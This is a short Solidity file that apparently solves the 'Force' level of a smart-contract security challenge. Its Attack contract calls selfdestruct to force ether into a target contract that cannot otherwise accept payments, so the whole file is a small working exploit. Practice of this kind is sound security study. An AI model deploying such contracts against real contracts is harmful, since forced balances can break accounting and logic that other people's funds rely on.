// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Force.sol";

contract Attack {
    Force public vulnerableContract;

    constructor(address _vulneraleContract) public {
        vulnerableContract = Force(payable(_vulneraleContract));
    }

    function attack() public payable {
        require(msg.value > 0);
        address payable addr = payable(address(vulnerableContract));
        selfdestruct(addr);
    }
}
